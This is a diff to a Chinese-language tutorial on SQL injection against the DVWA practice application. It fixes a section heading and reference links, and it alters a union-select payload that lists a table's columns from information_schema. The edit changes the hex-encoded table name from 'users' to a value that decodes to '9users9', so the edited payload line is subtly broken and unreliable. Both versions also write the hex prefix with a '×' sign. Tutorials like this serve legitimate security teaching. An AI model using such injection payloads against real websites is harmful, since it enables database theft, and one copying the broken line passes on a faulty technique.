@@ -290,7 +290,7 @@ $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
 我们可以通过十六进制的方式来使用单引号：
 
 ```
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #
+1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×39757365727339 #
 ```
 
 ###### 防御升级三
@@ -305,7 +305,7 @@ $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1
 
 其实之前已经绕过这种防御了，直接用`#`注释掉即可。
 
-###### 防御升级三
+###### 防御升级四
 
 ```
 // Get input
@@ -540,5 +540,5 @@ else {
 
 - 《白帽子讲Web安全》 吴翰清
 - 《SQL注入攻击与防御》 Justin Clarke
-- [新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)]({{ site.url }}/images/sql-injection/http://www.freebuf.com/articles/web/120985.html)
-- [新手指南：DVWA-1.9全级别教程之SQL Injection]({{ site.url }}/images/sql-injection/http://www.freebuf.com/articles/web/120747.html)
+- [新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)](http://www.freebuf.com/articles/web/120985.html)
+- [新手指南：DVWA-1.9全级别教程之SQL Injection](http://www.freebuf.com/articles/web/120747.html)
